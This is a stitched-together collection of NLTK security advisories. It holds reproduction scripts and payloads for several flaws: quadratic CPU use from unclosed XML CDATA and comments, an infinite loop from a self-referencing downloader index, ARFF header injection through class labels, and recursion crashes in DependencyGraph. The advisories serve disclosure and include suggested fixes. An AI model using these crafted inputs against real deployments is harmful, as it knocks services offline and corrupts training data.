For a fragment that stays "unclosed"
across many blocks -- a CDATA section or comment whose terminator (``]]>`` /
``-->``) lies far ahead -- every block costs O(current buffer length), so a
single document of N bytes costs ~O(N^2) character operations. The in-tag guard
added for GHSA-vp2x tracks only a bare '<'..'>' tag and is blind to unclosed
CDATA / comment state, so this class remains quadratic in the current release.

The attack documents are *well-formed* XML: comments and CDATA may legally
contain '<' and '>'.

Controls:
  1. Well-formedness: the attack document parses with ElementTree.
  2. Linear baseline on the same reader: an oversized *single tag* of the same
     size reads linearly when the in-tag guard is present (the fixed GHSA-vp2x
     case). On pre-guard builds it is quadratic too -- reported, not asserted.
  3. Public API reachability: ``list(XMLCorpusView(path, ".*"))`` drives the
     same sink.

Assertions:
  - attack doubling ratio t(4n)/t(n) must clearly exceed the linear bound (~4).
  - tag-control doubling ratio must be ~linear (< 8) when the guard is present.

Usage:
    python3 repro_xmlcorpusview_unclosed_cdata.py
Env:
    PYTHONPATH : site-packages of the nltk version under test (required)
    NLTK_BODY_SIZE : comment/CDATA body size in bytes (default 65536)
"""
import io
import os
import shutil
import sys
import tempfile
import time

import xml.etree.ElementTree as ET

# Point NLTK's sandbox at a private data root so the public API reachability
# check below may open its own corpus file (pathsec only trusts data roots and
# private temp dirs; a shared /tmp is not an allowed root).
_DATA_ROOT = os.environ.get("NLTK_DATA")
_CLEANUP_ROOT = None
if not _DATA_ROOT:
    _DATA_ROOT = tempfile.mkdtemp(prefix="nltk_xmlview_")
    os.environ["NLTK_DATA"] = _DATA_ROOT
    _CLEANUP_ROOT = _DATA_ROOT

from nltk.corpus.reader.xmldocs import XMLCorpusView


def elapsed(fn):
    start = time.perf_counter()
    fn()
    return time.perf_counter() - start


def build_comment_doc(body_size):
    # Well-formed XML: one root, one large comment containing '<' and '>' and
    # no '-->' before the closing marker.
    body = ("a<b<c<d>" * ((body_size // 8) + 1))[:body_size]
    return "<root><!-- " + body + " --></root>"


def build_cdata_doc(body_size):
    # Well-formed XML: one root, one large CDATA containing '<' and '>' and no
    # ']]>' before the closing marker.
    body = ("a<b<c<d>" * ((body_size // 8) + 1))[:body_size]
    return "<root><![CDATA[" + body + "]]></root>"


def build_unclosed_cdata_prefix(body_size):
    # The line-308 match input: an accumulating fragment that is still inside
    # an unclosed CDATA (no ']]>' yet). A distinct body alphabet avoids CPU-cache
    # reuse with the attack-timing buffers above, which would skew the timing.
    body = ("x<y<z<w>" * ((body_size // 8) + 1))[:body_size]
    return "<root><![CDATA[" + body


def build_giant_tag(body_size):
    # Control: a single oversized '<a ...>' tag, no '>' until the very end.
    return "<a " + ("x" * body_size) + ">"


def guard_present():
    import nltk.corpus.reader.xmldocs as m

    with open(m.__file__, encoding="utf-8") as fh:
        return "in_tag" in fh.read()


view = XMLCorpusView.__new__(XMLCorpusView)
results = []


def check(name, cond, detail=""):
    results.append(bool(cond))
    print(f"[{'PASS' if cond else 'FAIL'}] {name}" + (f"  ({detail})" if detail else ""))


def read_frag(doc):
    """Drive _read_xml_fragment, tolerating the EOF ValueError that pre-guard
    releases raise for CDATA-containing documents."""
    try:
        return view._read_xml_fragment(io.StringIO(doc))
    except ValueError as exc:
        return "ValueError: %s" % exc


def time_ratio(build, n1, n4):
    d1, d4 = build(n1), build(n4)
    t1 = elapsed(lambda: read_frag(d1))
    t4 = elapsed(lambda: read_frag(d4))
    return d1, d4, t1, t4


# ---- Sizes ---------------------------------------------------------------
body = int(os.environ.get("NLTK_BODY_SIZE", "65536"))
tag1, tag4 = 1 << 20, 4 << 20  # 1 MiB / 4 MiB (guard-present linear baseline)

# ---- Primary attack: large comment unclosed until its final '-->' ---------
c1, c4, t1, t4 = time_ratio(build_comment_doc, body, 4 * body)
ratio = t4 / t1
out1 = read_frag(c1)  # outcome probe (returned string vs ValueError)
outcome = "returned" if isinstance(out1, str) and not out1.startswith("ValueError") else out1
print(f"[TIMING] unclosed comment  n={len(c1)} t={t1:.3f}s  "
      f"4n={len(c4)} t={t4:.3f}s  ratio={ratio:.1f}  (n->{outcome})")
check(
    "attack document is well-formed XML (parses with ElementTree)",
    ET.fromstring(c1).tag == "root" and ET.fromstring(c4).tag == "root",
    f"both sizes parse; root element tag='{ET.fromstring(c1).tag}'",
)
check(
    "unclosed-comment read cost scales super-linearly (t(4n)/t(n) > 10; linear ~4)",
    ratio > 10.0,
    f"measured {ratio:.1f}",
)

# ---- CDATA variant ---------------------------------------------------------
has_guard = guard_present()
print(f"[INFO] in-tag guard present in module: {has_guard}")
d1, d4, td1, td4 = time_ratio(build_cdata_doc, body, 4 * body)
dratio = td4 / td1
dout = read_frag(d1)
doutcome = "returned" if isinstance(dout, str) and not dout.startswith("ValueError") else dout
print(f"[TIMING] CDATA variant       n={len(d1)} t={td1:.3f}s  "
      f"4n={len(d4)} t={td4:.3f}s  ratio={dratio:.1f}  (n->{doutcome})")
if has_guard:
    check(
        "CDATA variant also super-linear on guard-present build",
        dratio > 10.0,
        f"measured {dratio:.1f}",
    )
else:
    # Pre-guard releases cannot validate any CDATA (their regex's CDATA
    # alternative never matches), so the fragment ends in ValueError -- a
    # separate functional defect; report only.
    check(
        "pre-guard CDATA path ends in ValueError (regex cannot validate CDATA; report-only)",
        doutcome.startswith("ValueError"),
        str(doutcome),
    )

# ---- Single-match linearity of _VALID_XML_RE ------------------------------
# The quadratic total comes from re-running a *linear* whole-buffer match on
# every block, not from the regex itself backtracking super-linearly (a single
# match would then also blow up with input size). Verify single-match scaling.
# The assertion uses the 512 KiB -> 2 MiB pair (the 256 KiB size runs ~4x
# faster in an already-warmed engine, so it is reported but not asserted on).
def best_match_ms(buf):
    view._VALID_XML_RE.match(buf)  # warm-up (cache pattern + char-class state)
    return min(elapsed(lambda: view._VALID_XML_RE.match(buf)) for _ in range(3))


ms = {s: best_match_ms(build_unclosed_cdata_prefix(s)) for s in (1 << 18, 1 << 19, 1 << 20, 1 << 21)}
print(f"[TIMING] single _VALID_XML_RE.match  256KiB={ms[1 << 18]:.4f}s  512KiB={ms[1 << 19]:.4f}s  "
      f"1MiB={ms[1 << 20]:.4f}s  2MiB={ms[1 << 21]:.4f}s")
check(
    "single match scales ~linearly (512KiB->2MiB 4x input ~4x time; not super-linear)",
    ms[1 << 21] / ms[1 << 19] < 6.0,
    f"measured 4x ratio={ms[1 << 21] / ms[1 << 19]:.2f}",
)

# ---- Control: giant single tag on the same reader ---------------------------
if has_guard:
    g1, g4, tg1, tg4 = time_ratio(build_giant_tag, tag1, tag4)
    gratio = tg4 / tg1
    print(f"[TIMING] oversized tag (control)  n={tag1} t={tg1:.3f}s  "
          f"4n={tag4} t={tg4:.3f}s  ratio={gratio:.1f}")
    check(
        "oversized single tag reads linearly (guard present; t(4n)/t(n) < 8)",
        gratio < 8.0,
        f"measured {gratio:.1f}",
    )
else:
    g1, g4, tg1, tg4 = time_ratio(build_giant_tag, body, 4 * body)
    gratio = tg4 / tg1
    print(f"[TIMING] oversized tag (no guard)  n={len(g1)} t={tg1:.3f}s  "
          f"4n={len(g4)} t={tg4:.3f}s  ratio={gratio:.1f}")
    check(
        "oversized single tag also super-linear pre-guard (report-only)",
        gratio > 4.0,
        f"measured {gratio:.1f}",
    )

# ---- Reachability: the public XMLCorpusView API drives the same sink -------
path = os.path.join(_DATA_ROOT, "attack.xml")
with open(path, "w", encoding="utf-8") as fh:
    fh.write(c1)
try:
    items = list(XMLCorpusView(path, ".*"))
    check(
        "public API list(XMLCorpusView(path, '.*')) reads the attack document",
        len(items) >= 1,
        f"{len(items)} item(s) read from {len(c1)}-byte document",
    )
finally:
    if _CLEANUP_ROOT:
        shutil.rmtree(_CLEANUP_ROOT, ignore_errors=True)

passed = sum(results)
failed = len(results) - passed
print(f"RESULT {passed}/{len(results)} checks passed, {failed} failed")
sys.exit(0 if failed == 0 else 1)

items.title: [nltk] NLTK: XMLCorpusView comment and CDATA parsing permits quadratic CPU denial of service

items.content_html:
affected: PyPI nltk >= 3.6.7 — nltk.downloader index parsing (Downloader._update_index) dynamically reproduced: nltk 3.6.7 (4/4 checks), 3.9.2 (4/4), 3.10.3 (4/4), and develop 6818767b9 (4/4)

Source references (nltk/downloader.py:NNN) are to commit 6818767b9 (develop, v3.10.3-15-g6818767b9). The v3.10.3 tag and the released 3.10.3 wheel carry the identical code at the identical line numbers (the vulnerable closure BFS sits at downloader.py:1300-1310). Dynamically verified wheels additionally show the same defect at downloader.py:972 (3.9.2) and downloader.py:987 (3.6.7).

Summary

Downloader._update_index (nltk/downloader.py:1253-1313) is the mandatory first step of every downloader operation (download(), info(), packages(), collections(), list(), status()). After replacing each <item ref="…"> string with the actual Collection/Package object (downloader.py:1285-1290), it computes each collection's recursive package closure with a breadth-first walk that has no visited set and no depth cap:

# nltk/downloader.py:1300-1310
for collection in self._collections.values():
    packages = {}
    queue = [collection]
    for child in queue:
        if isinstance(child, Collection):
            queue.extend(child.children)
        elif isinstance(child, Package):
            packages[child.id] = child
    collection.packages = packages.values()

A self-referencing or mutually-referencing index — e.g. <collection id="a"><item ref="a"/></collection> — turns a.children into an object-level cycle, and the for child in queue: queue.extend(child.children) loop appends to the very list it is iterating, so the queue grows forever. The function never returns: CPU spins at 100% and memory grows without bound until the process is killed or the host runs out of memory. The identical finite input (one collection containing one package) completes in ~0.2 s on the control index, so the input is perfectly ordinary in size — only its self-reference is abnormal, and nothing validates it.

Details

Root cause is the combination of three unguarded steps:

  1. Collection.fromxml (nltk/downloader.py:362-369) stores each <item ref="…"> attribute verbatim as a string. It never checks whether a ref targets the collection's own id, or participates in a reference cycle.
  2. _update_index (nltk/downloader.py:1285-1290) replaces those ref strings with the live objects from self._collections / self._packages. A self- or mutual-reference therefore becomes an object-level cycle in children.
  3. The closure walk (nltk/downloader.py:1300-1310) iterates for child in queue while doing queue.extend(child.children) inside the loop. Python's list iterator consumes elements appended during iteration, so with a cycle the iterator and the queue length advance in lockstep forever. There is no visited set, no node-count cap, and no cycle detection.

The input is the data-server index that the downloader is designed to fetch and trust: _update_index pulls it with safe_parse(urlopen(self._url)) (nltk/downloader.py:1269-1271) and parses <collections>/<collection> elements with no structural validation. The index URL is a user-configurable product feature (server_index_url constructor argument, CLI -u / --url at downloader.py:3052-3058 — the option's dest is server_index_url — plus NLTK_DOWNLOAD_URL and the Shell/GUI "Set Server URL"), so an operator who uses a third-party mirror, or whose configured mirror is compromised, delivers the malicious index into exactly this code path on the next download or query.

PoC

The self-checking reproduction script embedded below runs the attack against a file://-hosted index (no network server needed; the hardened nltk.pathsec.urlopen accepts local file:// URLs) and a matching acyclic control index, in separate child processes under an address-space cap (RLIMIT_AS). That is the key to demonstrating the vulnerability safely and precisely: the control process completes under the cap, while the attack process — the same function, the same caller, the same finite 2-entry index — cannot finish and is aborted by MemoryError at queue.extend(child.children), proving both the hang (the function never returns) and the unbounded memory growth (a 2-entry index growing until the address-space cap is exhausted). Without the cap the loop simply runs forever.

Scope note: dynamically verified on the released 3.6.7, 3.9.2, and 3.10.3 wheels and on develop 6818767b9. 3.6.0–3.6.6 share the identical BFS code path (verified statically at the tag) but were not run; the downloader tool predates 3.6 and earlier releases were not assessed.

Environment for the recorded run: CPython 3.10.12 on Linux; the script defaults to a 512 MiB address-space cap per child and a 60 s hard timeout. All four version runs pass 4/4 checks.

Live transcript (recorded run on the nltk 3.10.3 wheel; the 3.6.7, 3.9.2, and develop 6818767b9 runs produce the same 4/4 result, differing only in the downloader.py line number in the traceback — 987, 972, and 1305 respectively — and the elapsed time):

[PASS] precondition: cyclic index has a self-referencing <collection>  (ref='a' inside <collection id='a'>)
[PASS] precondition: acyclic control index references only packages
[control] returned rc=0 in 0.2s
[PASS] control: Downloader.packages() returned (no hang)
[PASS] control: _packages parsed = ['p1']
[PASS] control: collection 'a' closure = ['p1'] (finite, as documented)
[PASS] control: acyclic index completes and yields the documented finite closure  (rc=0)
[attack] rc=1 after 6.6s
[attack] entering Downloader.packages() on the self-referencing index ...
Traceback (most recent call last):
  File "<string>", line 38, in <module>
  File "nltk/downloader.py", line 627, in packages
    self._update_index()
  File "nltk/downloader.py", line 1305, in _update_index
    queue.extend(child.children)
MemoryError
[PASS] attack: self-referencing index is not completed -- process aborted by the 512 MiB address-space cap (unbounded queue growth)  (rc=1, MemoryError)
nltk under test: 3.10.3
RESULT 4/4 checks passed, 0 failed

The malicious index is exactly:

<index>
  <packages>
    <package id="p1" name="Sample corpus" subdir="corpora/p1"
             url="http://example.invalid/p1.zip" unzip="0" size="0" unzipped_size="0"/>
  </packages>
  <collections>
    <collection id="a" name="Cyclic collection">
      <item ref="a"/>
      <item ref="p1"/>
    </collection>
  </collections>
</index>

Impact

  • Type: CWE-835 / CWE-400 — denial of service. A single fetch of a cyclic index hangs the downloader process with unbounded CPU and memory consumption; no confidentiality or integrity impact.
  • Who is impacted: any deployment that uses nltk.downloader (directly, via nltk.download(), or through the Shell/GUI) against an index URL it does not fully control — third-party mirrors, internal mirrors, or the default GitHub-hosted index if it is ever compromised or MITM'd. Every entry point (download(), info(), packages(), collections(), status()) funnels through _update_index and is blocked.
  • Attacker requirements: ability to serve an index XML at a URL the victim configures (operator error, malicious mirror, compromised/CDN-poisoned index host, or traffic interception). The victim is only required to use the URL once; the hang then recurs on every downloader operation until the index is replaced. No privileges and no interaction beyond the initial URL configuration are required.
  • Effect: the process is permanently wedged in the closure BFS — 100% CPU and monotonically growing memory until OOM-killed. With the default 60-minute index refresh, merely running nltk.download() in a script or service turns a single poisoned index into an unresolvable hang.

Suggested fix: add a visited set to the closure BFS so each Collection is expanded at most once (a cycle then contributes its packages once instead of looping), e.g.:

for collection in self._collections.values():
    packages = {}
    queue = [collection]
    seen = set()
    for child in queue:
        if isinstance(child, Collection):
            if child.id in seen:
                continue
            seen.add(child.id)
            queue.extend(child.children)
        elif isinstance(child, Package):
            packages[child.id] = child
    collection.packages = packages.values()

Defense-in-depth: cap the number of expanded nodes (or detect and refuse cyclic ref chains in Collection.fromxml / during the ref-replacement at downloader.py:1285-1290) so malformed or hostile indexes are rejected at parse time rather than at walk time. Add a regression test that serves a self-referencing collection index and asserts packages()/info() terminate and either skip or reject the cycle.

Reproduction script (self-contained)

#!/usr/bin/env python3
"""Self-checking reproduction: a cyclic collection index makes
``nltk.downloader.Downloader._update_index`` loop forever and exhaust memory.

Attack: an index XML whose ``<collection>`` references itself (or a mutual
cycle) becomes an object-level cycle when ``_update_index`` replaces ``ref``
strings with real ``Collection`` objects. The package-closure walk
(``for child in queue: ... queue.extend(child.children)``) has no visited set
and no depth cap, so the queue grows forever and the function never returns.

Controls:
  * an acyclic index of the same shape completes and yields the expected
    closure (the same function, the same caller, under the same memory cap);
  * the attack never returns normally: it either keeps running past a hard
    timeout (observed hang) or is aborted by the child's address-space cap
    (unbounded memory growth) -- in both cases the exact finite input that the
    control handles instantly cannot be completed.

Usage:
  python3 repro_nltk_downloader_cyclic_index.py [MEMCAP_MIB]

Environment:
  NLTK_WHEEL   path to an ``nltk`` wheel. If ``import nltk`` fails, the wheel is
               installed into a scratch dir and put on PYTHONPATH for the
               verification children.
  NLTK_TIMEOUT  hard timeout seconds for each child (default: 60).
  MEMCAP_MIB    address-space cap per child in MiB (default: 512); can also be
               passed as the first positional argument.
"""

import os
import resource
import subprocess
import sys
import tempfile
import textwrap
import time
from xml.etree import ElementTree

def _default_memcap():
    if len(sys.argv) > 1 and sys.argv[1] != "--child":
        raw = sys.argv[1]
    else:
        raw = os.environ.get("MEMCAP_MIB", "512")
    try:
        value = int(raw)
    except (TypeError, ValueError):
        print("warning: invalid MEMCAP_MIB %r, falling back to 512" % raw, file=sys.stderr)
        return "512"
    return str(value) if value > 0 else "512"


MEMCAP_MIB = int(_default_memcap())
CHILD_TIMEOUT = float(os.environ.get("NLTK_TIMEOUT", "60"))

CYCLIC_INDEX = """<?xml version="1.0"?>
<index>
  <packages>
    <package id="p1" name="Sample corpus" subdir="corpora/p1"
             url="http://example.invalid/p1.zip" unzip="0" size="0" unzipped_size="0"/>
  </packages>
  <collections>
    <collection id="a" name="Cyclic collection">
      <item ref="a"/>
      <item ref="p1"/>
    </collection>
  </collections>
</index>
"""

ACYCLIC_INDEX = """<?xml version="1.0"?>
<index>
  <packages>
    <package id="p1" name="Sample corpus" subdir="corpora/p1"
             url="http://example.invalid/p1.zip" unzip="0" size="0" unzipped_size="0"/>
  </packages>
  <collections>
    <collection id="a" name="Acyclic collection">
      <item ref="p1"/>
    </collection>
  </collections>
</index>
"""

CHILD_DRIVER = r"""
import os
import resource
import sys

import nltk
import nltk.data as nltk_data

mode, url, workdir = sys.argv[1], sys.argv[2], sys.argv[3]

# Allow the local index file to be read under hardened pathsec (ENFORCE mode).
nltk_data.path.append(workdir)

cap = int(os.environ["NLTK_CHILD_MEMCAP_MIB"]) * 1024 * 1024
resource.setrlimit(resource.RLIMIT_AS, (cap, cap))

from nltk.downloader import Downloader

downloader = Downloader(server_index_url=url)

if mode == "control":
    # _update_index() runs to completion here; the acyclic closure is finite.
    packages = list(downloader.packages())
    ids = sorted(p.id for p in packages)
    print("[PASS] control: Downloader.packages() returned (no hang)")
    assert ids == ["p1"], ids
    print("[PASS] control: _packages parsed = %r" % ids)
    col = next(c for c in downloader.collections() if c.id == "a")
    closure = sorted(p.id for p in col.packages)
    assert closure == ["p1"], closure
    print("[PASS] control: collection 'a' closure = %r (finite, as documented)" % closure)
    sys.exit(0)
elif mode == "attack":
    # This call drives _update_index -> the collection-closure BFS. The index
    # collection self-references itself, so the BFS never terminates; the queue
    # keeps growing until the address-space cap aborts the process.
    print("[attack] entering Downloader.packages() on the self-referencing index ...")
    _ = downloader.packages()
    print("[FAIL] attack: Downloader.packages() RETURNED -- cycle was not triggered")
    sys.exit(2)
else:
    print("[FAIL] unknown mode %r" % mode)
    sys.exit(2)
"""


def build_site_env(workdir):
    """Return (env, site_path_or_None) so the children can import nltk."""
    probe = subprocess.run(
        [sys.executable, "-c", "import nltk"],
        capture_output=True,
    )
    if probe.returncode == 0:
        return dict(os.environ), None
    wheel = os.environ.get("NLTK_WHEEL")
    if not wheel:
        return None, None
    site = os.path.join(workdir, "site")
    subprocess.run(
        [sys.executable, "-m", "pip", "install", "--quiet", "--target", site, wheel],
        check=True,
    )
    env = dict(os.environ)
    env["PYTHONPATH"] = site + (os.pathsep + env["PYTHONPATH"] if env.get("PYTHONPATH") else "")
    return env, site


def run_child(env, script, mode, url, workdir):
    cmd = [sys.executable, script, "--child", mode, url, workdir]
    start = time.monotonic()
    try:
        proc = subprocess.run(
            cmd,
            env=env,
            capture_output=True,
            text=True,
            timeout=CHILD_TIMEOUT,
        )
        timed_out = False
    except subprocess.TimeoutExpired as exc:
        proc = exc
        timed_out = True
    elapsed = time.monotonic() - start
    stdout = proc.stdout if hasattr(proc, "stdout") else ""
    stderr = proc.stderr if hasattr(proc, "stderr") else ""
    return timed_out, getattr(proc, "returncode", None), stdout, stderr, elapsed


def main():
    results = []

    def check(name, cond, detail=""):
        results.append(bool(cond))
        print("[%s] %s%s" % ("PASS" if cond else "FAIL", name, ("  (%s)" % detail if detail else "")))

    with tempfile.TemporaryDirectory(prefix="nltk_cycle_") as workdir:
        cyclic_path = os.path.join(workdir, "index_cyclic.xml")
        acyclic_path = os.path.join(workdir, "index_acyclic.xml")
        with open(cyclic_path, "w") as fh:
            fh.write(CYCLIC_INDEX)
        with open(acyclic_path, "w") as fh:
            fh.write(ACYCLIC_INDEX)
        cyclic_url = "file://" + cyclic_path
        acyclic_url = "file://" + acyclic_path

        # --- Input modeling preconditions -------------------------------
        cyc = ElementTree.parse(cyclic_path).getroot()
        col = cyc.find("collections/collection")
        check(
            "precondition: cyclic index has a self-referencing <collection>",
            col is not None and col.get("id") == "a"
            and any((it.get("ref") == "a" for it in col.findall("item"))),
            "ref='a' inside <collection id='a'>",
        )
        acy = ElementTree.parse(acyclic_path).getroot()
        cola = acy.find("collections/collection")
        check(
            "precondition: acyclic control index references only packages",
            cola is not None and [it.get("ref") for it in cola.findall("item")] == ["p1"],
        )

        env, site = build_site_env(workdir)
        if env is None:
            print("FAIL: nltk is not importable and NLTK_WHEEL is unset", file=sys.stderr)
            return 1
        child_env = dict(env)
        child_env["NLTK_CHILD_MEMCAP_MIB"] = str(MEMCAP_MIB)

        # --- Control: acyclic index completes under the same memory cap ---
        t, rc, out, err, el = run_child(child_env, __file__, "control", acyclic_url, workdir)
        print("[control] returned rc=%s in %.1fs%s" % (rc, el, " (TIMEOUT)" if t else ""))
        if out:
            print(out, end="")
        if err:
            print(err, end="")
        check(
            "control: acyclic index completes and yields the documented finite closure",
            (not t) and rc == 0 and "collection 'a' closure = ['p1']" in (out + err),
            "rc=%s" % rc,
        )

        # --- Attack: cyclic index must NOT complete ----------------------
        t, rc, out, err, el = run_child(child_env, __file__, "attack", cyclic_url, workdir)
        print("[attack] rc=%s after %.1fs%s" % (rc, el, " (still running at timeout)" if t else ""))
        if out:
            print(out, end="")
        if err:
            print(err, end="")
        if t:
            check(
                "attack: self-referencing index hangs _update_index past the %ss timeout" % CHILD_TIMEOUT,
                True,
                "process still running, queue growing unboundedly",
            )
        elif rc is not None and rc != 0:
            memory = "MemoryError" in (out + err) or "MemoryError" in err
            check(
                "attack: self-referencing index is not completed -- process aborted by the %s MiB address-space cap (unbounded queue growth)" % MEMCAP_MIB,
                memory,
                "rc=%s, %s" % (rc, "MemoryError" if memory else "non-zero exit"),
            )
        else:
            check(
                "attack: self-referencing index hangs _update_index (vulnerability reproduced)",
                False,
                "function returned -- cyclic input was handled",
            )

        # --- Version banner ---------------------------------------------
        ver_out = subprocess.run(
            [sys.executable, "-c", "import nltk; print(nltk.__version__)"],
            env=env,
            capture_output=True,
            text=True,
        ).stdout.strip()
        print("nltk under test: %s" % (ver_out or "unknown"))

    passed = sum(results)
    failed = len(results) - passed
    print("RESULT %d/%d checks passed, %d failed" % (passed, len(results), failed))
    return 0 if failed == 0 else 1


if __name__ == "__main__":
    if len(sys.argv) >= 2 and sys.argv[1] == "--child":
        os.execv(sys.executable, [sys.executable, "-c", textwrap.dedent(CHILD_DRIVER)] + sys.argv[2:])
    sys.exit(main())

Fix status (2026-09-28)

Status: MERGED on develop (unreleased; v3.10.3 of 2026-08-12 predates the fix).

PR: #3767 "Prevent infinite loop from cyclic collection indices" (ekaf), merged 2026-08-20, merge commit d2eb09a5b on develop. Fix commit: b77d329db (the downloader walks the collection closure with nltk.util.acyclic_breadth_first).

Probe: nltk/test/unit/security_probes/ghsa_pcm8_fqjx_rvx8.py (added in d53d0b790 on that PR); verdict on develop 2fa3f48fe: FIXED (cyclic collection graphs terminate: self, mutual, chain, diamond).

Description

Summary

nltk.classify.weka.ARFF_Formatter writes class labels directly into the Weka ARFF @ATTRIBUTE '-label-' {...} declaration without any ARFF quoting or escaping. An attacker who can contribute class labels to a training dataset can include ARFF metacharacters such as }, newlines, @ATTRIBUTE, and @DATA to break out of the nominal label list and inject attacker‑controlled ARFF schema and data directives.

This vulnerability is reachable in any application that calls WekaClassifier.train() or ARFF_Formatter.from_train() with attacker‑influenced training data. The victim does not need to manually edit the ARFF file; the normal training workflow writes the malformed ARFF automatically.

Technical Details

The vulnerable code path is:

  1. WekaClassifier.train() calls ARFF_Formatter.from_train(featuresets).
  2. from_train() extracts labels from the training data and passes them to ARFF_Formatter(labels, features).
  3. header_section() uses ",".join(self._labels) directly, embedding attacker‑controlled strings into the ARFF header without sanitization.

Because the label names are not escaped, a label containing safe}\n@ATTRIBUTE injected NUMERIC\n@DATA\n0,owned\n% will close the label set, inject a new attribute, start a premature data section, and comment out the remaining header.

Proof of Concept

The following self‑contained Python script demonstrates the vulnerability. It requires only NLTK and does not need Weka to be installed, because the attack is carried out purely by generating the ARFF string.

from nltk.classify.weka import ARFF_Formatter

# Attacker‑controlled label containing ARFF metacharacters.
# The `}` closes the label set, the `@ATTRIBUTE` injects a new attribute,
# `@DATA` starts the data section early, and `%` comments out the rest.
malicious_label = "safe}\n@ATTRIBUTE injected NUMERIC\n@DATA\n0,owned\n%"

featuresets = [
    ({"f": "benign"}, "legit"),          # legitimate example
    ({"f": "payload"}, malicious_label), # attacker's example
]

# NLTK builds the formatter from the training data
formatter = ARFF_Formatter.from_train(featuresets)

# Generate the ARFF string – this is what would be written to the training file
arff = formatter.format(featuresets)

# Verify that the injection succeeded
assert "@ATTRIBUTE injected NUMERIC" in arff, "Injected attribute not found"
assert "@DATA\n0,owned" in arff, "Injected data row not found"

print("=== Injected ARFF (excerpt) ===")
for line in arff.splitlines()[5:12]:
    print(line)

Expected output:

=== Injected ARFF (excerpt) ===
@ATTRIBUTE 'f' STRING
@ATTRIBUTE '-label-' {legit,safe}
@ATTRIBUTE injected NUMERIC
@DATA
0,owned
%

Explanation of the injection:

· The label safe} closes the nominal label set {legit,safe} prematurely. · The following lines (@ATTRIBUTE injected NUMERIC, @DATA, 0,owned) are then parsed as legitimate ARFF directives, not as part of the label name. · The % at the end comments out the remaining header lines that NLTK would have appended, preventing syntax errors.

References

· CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component · Huntr report https://huntr.com/bounties/bc7085e7-1caf-40c7-b406-a5099ce44072 · Weka ARFF format documentation

items.content_html:
Summary

DependencyGraph.tree()/triples() walk the parsed dependency structure using plain, unbounded Python recursion — one stack frame per edge in the graph — and never use the class's own cycle detector. A crafted dependency-parse file with a few thousand chained tokens (an entirely ordinary-looking long sentence) crashes the process with an unhandled RecursionError the moment .tree() or .triples() is called — which is NLTK's own documented usage pattern immediately after loading such a file.

Details

DependencyGraph._tree() (lines 393-406), .tree() (408-417), and .triples() (419-432) in nltk/parse/dependencygraph.py rebuild/walk the graph with Tree(word, [self._tree(dep) for dep in deps]) and yield from self.triples(node=dep) — ordinary recursive calls, one per edge, with no depth check. contains_cycle() is defined on the class (line 447) but is never invoked by any of these three methods.

This is exactly the CWE-674 pattern the project has already identified and fixed elsewhere: nltk/tree/tree.py adds MAX_TREE_DEPTH = 500 with a comment stating that an arbitrarily deep tree would make every traversal raise RecursionError, and nltk/test/unit/test_recursion_dos.py locks in the identical fix for FeatStructReader, LogicParser, and ResolutionProver. But DependencyGraph builds its Tree objects programmatically (Tree(word, [...])), which bypasses MAX_TREE_DEPTH entirely — that guard only fires inside Tree.fromstring()'s bracket-string parser, never in Tree.__init__. DependencyGraph's own recursive walk has no depth limit of its own.

Any Malt-TAB/CoNLL(3/4/7/10)-format text — read via DependencyCorpusReader (nltk/corpus/reader/dependency.py, lines 62-69, backing the public, documented nltk.corpus.dependency_treebank and nltk.corpus.conll2007 corpora) or via the public classmethod DependencyGraph.load(filename) (~line 213) / DependencyGraph(text) directly — that chains more tokens than Python's default recursion limit (1000) via consecutive head references crashes with an unhandled RecursionError the moment .tree()/.triples() is called. Calling .tree() immediately after parsed_sents() is not a contrived edge case — it is NLTK's own documented usage pattern (nltk/test/corpus.doctest: print(conll2007.parsed_sents('esp.train')[0].tree()); nltk/test/dependency.doctest: dg.tree().pprint()).

Related observation: contains_cycle() itself has a separate bug that means it wouldn't help even if it were called on this path — it iterates node["deps"] as if it were a flat list of neighbor addresses, but _parse()/add_arc() actually store deps as {relation_label: [addresses]}; iterating that dict yields relation-label strings, which then fail the dep not in self.nodes check and get silently skipped. So contains_cycle() returns False (a false negative) on real parsed/add_arc()-built graphs even when a genuine cycle exists — it only works on the flat-list shape used in its own docstring example. This reinforces that there is no working recursion/cycle safety net on this code path today.

PoC

A tiny (few KB) 3-column Malt-TAB file: one root line w1 ROOT 0 followed by ~2000-3000 lines wi X i-1, each chaining a token to the previous one (an entirely ordinary-looking long sentence/coordination structure). Verified directly against current source:

  1. Constructing a DependencyGraph from a 3000-token linear chain and calling .tree() → RecursionError: maximum recursion depth exceeded. Confirmed.
  2. Same graph, .triples() fully consumed → RecursionError. Confirmed.
  3. Full realistic path: wrote the 3000-token chain to a temp file, read it back through an actual DependencyCorpusReader (the exact class backing dependency_treebank/conll2007) via parsed_sents(), then called .tree() on the result → RecursionError, end-to-end through the real public API.

(One honest correction to an earlier draft of this finding: a "two lines whose head columns reference each other" file-based cycle does not actually reach this crash the way it might seem — in the single-head-per-token Malt-TAB/CoNLL format, a genuine mutual-reference pair can't simultaneously be reachable from the graph's root and form a back-edge, so it either leaves self.root = None, or the pair becomes a disconnected island that's silently walked past without crashing. The long-chain vector above is the one that's fully, independently confirmed; a cycle built via direct add_arc() graph manipulation does also crash, but that's a narrower trigger than a parsed file.)

Impact

An unauthenticated party who can get a crafted CoNLL/Malt-TAB dependency file processed by a downstream application — a treebank upload, a shared-task submission portal, a user-editable corpus directory, or any code calling DependencyGraph.load()/DependencyGraph() on user-supplied text — crashes that request/worker/script with no further interaction needed. 100% reliable, trivial to construct.

Suggested fix: apply the same MAX_TREE_DEPTH-style depth guard used elsewhere in the codebase to _tree()/tree()/triples(), and fix contains_cycle()'s dict-vs-flat-list bug so it can actually be invoked as a real safety net on this path.

Fix status (2026-09-28)

Status: MERGED on develop (unreleased; v3.10.3 of 2026-08-12 predates the fix).

PR: #3885 "Bound recursion depth in parsers and traversal helpers" (ekaf), merged 2026-09-11, merge commit e521ecafc on develop.

Fix commit: a74682757 (nltk/parse/dependencygraph.py: _tree, tree and triples stop at MAX_DEPTH=200 with ValueError instead of recursing until RecursionError).

Probe: none of its own; nltk/test/unit/security_probes/ghsa_xfcv_m889_fmqg.py covers tree() and reports FIXED on develop 2fa3f48fe. The advisory PoC re-run on develop 2fa3f48fe (a 3000-token Malt-TAB chain): tree() and list(triples()) both raise ValueError (exceeded MAX_DEPTH=200), no RecursionError.
